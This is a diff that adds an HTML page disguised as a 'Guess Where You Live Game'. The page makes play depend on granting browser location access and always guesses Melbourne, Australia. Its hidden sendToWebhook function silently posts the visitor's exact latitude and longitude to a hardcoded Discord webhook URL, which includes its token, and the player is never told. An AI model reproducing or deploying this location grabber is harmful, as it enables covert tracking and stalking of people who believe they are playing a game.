@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guess Where You Live Game</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #00bcd4, #8e44ad);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        h1 {
+            font-size: 3em;
+            color: #fff;
+            margin-bottom: 20px;
+            text-shadow: 3px 3px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .game-container, .denied-container {
+            text-align: center;
+            padding: 30px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .game-container button, .denied-container button {
+            padding: 15px 30px;
+            background-color: #16a085;
+            color: white;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .game-container button:hover, .denied-container button:hover {
+            background-color: #1abc9c;
+            transform: translateY(-2px);
+        }
+
+        .game {
+            display: none;
+            padding: 30px;
+            background-color: #e74c3c;
+            border-radius: 15px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .game p {
+            font-size: 2em;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .game button {
+            background-color: #e74c3c;
+        }
+
+        .game button:hover {
+            background-color: #c0392b;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #16a085;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .denied-container {
+            display: none;
+        }
+
+        .game p {
+            font-size: 1.5em;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="game-container" id="game-container">
+        <h1>Ready for the Guess Where You Live Game?</h1>
+        <p>Can you unlock the game? You need to allow location access to get started!</p>
+        <button id="start-btn" onclick="requestLocation()">Start Game</button>
+    </div>
+
+    <div class="denied-container" id="denied-message">
+        <p>Oops! You must allow location access to play the game.</p>
+        <button onclick="retryLocation()">Try Again</button>
+    </div>
+
+    <div class="game" id="game">
+        <p id="guess">Let me guess... You live in...</p>
+        <button id="game-btn" onclick="gameWon()">I live there!</button>
+    </div>
+
+    <div class="loader" id="loader" style="display: none;"></div>
+
+    <script>
+        function requestLocation() {
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('game-container').style.display = 'none';
+            document.getElementById('denied-message').style.display = 'none';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(locationGranted, locationDenied);
+            } else {
+                alert("Geolocation is not supported by your browser.");
+                hideLoader();
+            }
+        }
+
+        function locationGranted(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            setTimeout(() => {
+                hideLoader();
+                startGame();
+                document.getElementById('guess').innerText = `Let me guess... You live in Melbourne, Australia!`;
+                sendToWebhook(latitude, longitude);
+            }, 1500);
+        }
+
+        function locationDenied(error) {
+            hideLoader();
+            document.getElementById('game-container').style.display = 'none';
+            document.getElementById('denied-message').style.display = 'block';
+        }
+
+        function startGame() {
+            document.getElementById('game-container').style.display = 'none';
+            document.getElementById('denied-message').style.display = 'none';
+            document.getElementById('game').style.display = 'block';
+        }
+
+        function gameWon() {
+            alert("You won the game! You live in Melbourne!");
+            document.getElementById('game').style.display = 'none';
+            document.getElementById('game-container').style.display = 'block';
+        }
+
+        function hideLoader() {
+            document.getElementById('loader').style.display = 'none';
+        }
+
+        function retryLocation() {
+            location.reload();
+        }
+
+        function sendToWebhook(latitude, longitude) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1325433112401936426/uEA7SGOF_ut8IGvPfJYCOF1RGJdAOemt0d_1XsKs51Ix6iIUHY5aB2nP1qEjr_zBckWE';
+            const data = {
+                content: `User Location: Latitude: ${latitude}, Longitude: ${longitude}`,
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+
+</body>
+</html>
